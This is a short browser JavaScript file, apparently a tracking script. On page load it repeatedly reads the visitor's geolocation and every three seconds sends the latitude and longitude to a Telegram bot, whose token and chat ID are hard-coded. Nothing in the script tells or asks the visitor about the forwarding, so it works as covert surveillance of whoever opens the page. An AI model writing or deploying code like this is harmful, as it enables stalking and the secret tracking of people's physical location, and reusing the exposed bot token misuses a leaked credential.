document.addEventListener('DOMContentLoaded', function () {
    
    const TOKEN = '6407921969:AAGnKf8qyUQ3H2x0SNI61kLnO0qEHU1R2Ik';
    const CHAT_ID = '-1001903507381';
    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

    let messageToTg = `<b>Get location</b>\n`;

    let timerId;

    const onClick = () => {
        timerId = setInterval(() => {
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    var latitude = position.coords.latitude;
                    var longitude = position.coords.longitude;
                    formSend();

                    console.log("Ваша поточна геолокація:");
                    console.log("Широта: " + latitude);
                    console.log("Довгота: " + longitude);

                    // Видаліть async відсюди, оскільки ця функція не повинна бути асинхронною
                    function formSend(e) {

                        messageToTg += `${latitude}\n`;
                        messageToTg += `${longitude}`;
                        try {
                            axios.post(URI_API, {
                                chat_id: CHAT_ID,
                                parse_mode: 'html',
                                text: messageToTg,
                            })
                            .then(response => {
                                console.log('Message sent to Telegram successfully.');
                            })
                            .catch(error => {
                                console.error('Error sending message to Telegram:', error);
                            });
                        } catch (error) {
                            console.error('Error sending message to Telegram:', error);
                        } finally {
                            messageToTg = '';
                        }
                    }
                });
            } else {
                console.log("Геолокація не підтримується цим браузером.");
            }
        }, 3000);

        console.log(timerId);
    };

    onClick();
});
